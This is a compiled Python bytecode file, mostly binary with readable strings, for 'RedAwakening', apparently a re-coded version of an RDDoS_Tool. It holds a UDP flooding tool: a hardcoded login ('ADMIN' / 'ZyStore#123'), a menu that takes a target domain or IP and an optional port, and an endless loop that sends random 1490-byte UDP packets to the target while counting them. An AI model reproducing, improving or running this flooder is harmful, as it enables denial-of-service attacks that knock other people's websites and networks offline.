�

�dc           @   s  d  d l  m Z d  d l m Z d  d l Z d  d l Z d  d l Z d  d l Z d Z e �  Z	 e	 d k rt d Z
 n d Z e j e � e j e j e j � Z e j d � Z d	 �  Z e �  xPe rd
 GHd GHd GHd GHd GHd GHe e d � � Z e d k r(e e d � � Z e j e � Z Pq� e d k rJe e d � � Z Pq� e d k rod GHd GHe d � Z q� e d k r�d GHd GHd GHd GHe d � Z e j e � q� e d k r�d GHe d � Z e j e � q� e d  k r�e �  q� d! GHe j d" � e j e � q� We Z d" Z xx e e d# � � Z e d$ k sJe d k rfe Z e  e d% � � Z Pq e d& k s~e d' k r�Pq d! GHe j d" � q We j e � d( GHe j d) � d* GHe j d+ � d) Z! e e k rdyw xp e rPe d, k r�d) Z n e d- k rd. Z n  e j" e e e f � e! d) 7Z! e d) 7Z d/ e! e e f GHq�WWqd0 GHqXn� e e k re d" k  r�d" Z n* e d, k r�d" Z n e d- k r�d. Z n  yC x< e r�e j" e e e f � e! d) 7Z! d/ e! e e f GHq�WWqd0 GHqXn  d S(1   i����(   t   system(   t   tqdmNs   1.2t   Windowst   clst   cleari�  c          C   s�   t  d � }  t j d � d GHt j d � d GHt j d � t j d � d GHd GHt  d	 � } |  d
 k r� | d k r� d GHt j d � d GHd GHt j d � t j d � d GHt j d � d GHt j d � t j d � n d GHt j d � t �  d  S(   Ns   [35mEnter Your Username:[31m i   s"   [31 WARN: Do not share this tool!s%   [31 WARN: Please wait 5 Seconds![0mi   R   s$                           [1mPASSWORDs$                           [1mREQUIREDs   [35mEnter Your Password:[31m t   ADMINs   ZyStore#123s)   [1mSearching Username [32m[ ADMIN ][0mi   s/   [1mSearching Password [32m[ ZyStore#123 ][0ms   [1m[32mLOGIN SUCCESS!!s   [1mASKING FOR PERMISSION....s    [1mPlease wait 2-4 seconds.[0mi   s4   [31mInvalid username or password. Please try again.(   t   inputt   timet   sleept   osR    t   exit(   t   usernamet   password(    (    s   /sdcard/RedAwakening.pyt   login   s2    s/                           Author: Mr.[91mRed[0ms)                       Source: GitHub Mr.Reds'                         RE-CODE By ZyinXXs   [92;1msD   1. Website Domain
2. IP Address
3. About
T. Update
Y. Source
X. Exits   [0ms   
> t   1s   Domain:t   2s   IP Address: t   3s   Created by Mr.Red (BIG THANKS)s   Recode By ZyinXXs   






Press Enter to continue.t   Ts                     [1mUPDATEs   [+] Add Login Systems   [+] Encrypt Codes   [+] Recode Error Code[0mt   Ys:   [34mGitHub: https://github.com/Red-company/RDDoS_Tool[0mt   Xs   [91mInvaild Choice![0mi   s   Certain port? [y/n]: t   ys   Port: t   nt   Ns   [36;2mINITIALIZING....i   s   STARTING...i   i��  il  im  s,   [32;1mSent %s packets to %s through port:%ss   
[31;1mExited[0m(#   t   platformR    t	   tqdm.autoR   R	   R   t   randomt   sockett   versiont   unamet   cmd_clear_cleart	   cmd_cleart   AF_INETt
   SOCK_DGRAMt   sockt   _urandomt   bytesR   t   Truet   strR   t   optt   domaint   gethostbynamet   ipt   goonR
   R   t   Falset	   port_modet   portt	   port_boolt   intt   sentt   sendto(    (    (    s   /sdcard/RedAwakening.pyt   <module>   s�   				
			

				
